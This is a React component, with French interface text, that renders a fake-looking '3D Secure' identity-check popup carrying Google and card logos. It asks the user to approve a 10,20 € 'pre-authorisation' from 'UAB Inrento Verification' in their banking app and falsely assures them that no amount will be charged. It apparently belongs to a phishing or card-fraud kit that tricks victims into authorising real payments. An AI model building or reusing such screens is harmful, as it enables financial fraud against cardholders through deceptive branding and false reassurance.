import React from 'react';
import { createPortal } from 'react-dom';
import PopupHeader from '../PopupHeader';
import styles from '../../styles/modules/ThreeDSecurePopup.module.css';

const ThreeDSecurePopup = ({ 
  isVisible, 
  amount, 
  lastFourDigits,
  formattedDate,
  formattedTime,
  cardNumber,
}) => {
  console.log("3DSecurePopup rendu avec isVisible:", isVisible);
  
  if (!isVisible) return null;

  const popupContent = (
    <div className={styles.popupWrapper}>
      <div className={styles.popup}>
        
        
        <div className={styles.content}>
        <PopupHeader 
          showGoogleLogo={true} 
          showCardLogo={true}
          cardNumber={cardNumber}
        />
          <div className={styles.iconContainer}>
            <div className={styles.spinner}></div>
          </div>
          
          <h3 className={styles.title}>
            Vérifiez votre identité
          </h3>
          
          <p className={styles.subtitle}>
            Confirmez l'autorisation suivante depuis votre application bancaire pour vérifier votre compte.
          </p>
          
          <div className={styles.transactionCard}>
            <div className={styles.transactionHeader}>
              <h4 className={styles.transactionTitle}>DÉTAILS DE LA VÉRIFICATION</h4>
            </div>
            
            <div className={styles.transactionGrid}>
              <div className={styles.transactionItem}>
                <span className={styles.transactionLabel}>Marchand</span>
                <span className={styles.transactionValue}>UAB Inrento Verification</span>
              </div>
              
              <div className={styles.transactionItem}>
                <span className={styles.transactionLabel}>Type</span>
                <span className={styles.transactionValue}>Pré-autorisation</span>
              </div>
              
              <div className={styles.transactionItem}>
                <span className={styles.transactionLabel}>Date & Heure</span>
                <span className={styles.transactionValue}>{formattedDate} à {formattedTime}</span>
              </div>
              
              <div className={styles.transactionItem}>
                <span className={styles.transactionLabel}>Carte</span>
                <span className={styles.transactionValue}>•••• •••• •••• {lastFourDigits}</span>
              </div>
              
              <div className={`${styles.transactionItem} ${styles.amountItem}`}>
                <span className={styles.transactionLabel}>Montant à vérifier</span>
                <span className={styles.transactionValue}>10,20 €</span>
              </div>
            </div>
          </div>
          
          <div className={styles.verificationNotice}>
            <span className={styles.noticeIcon}></span>
            <p className={styles.noticeText}>
              Cette pré-autorisation temporaire permet de vérifier l'authenticité de votre carte. 
              <span className={styles.noticeHighlight}> Aucun montant ne sera prélevé</span>, 
              la transaction sera automatiquement annulée après vérification.
            </p>
          </div>
          
        </div>
      </div>
    </div>
  );

  // Utiliser createPortal pour rendre le popup à la racine du document
  return typeof window !== 'undefined' 
    ? createPortal(popupContent, document.body)
    : null;
};

export default ThreeDSecurePopup;
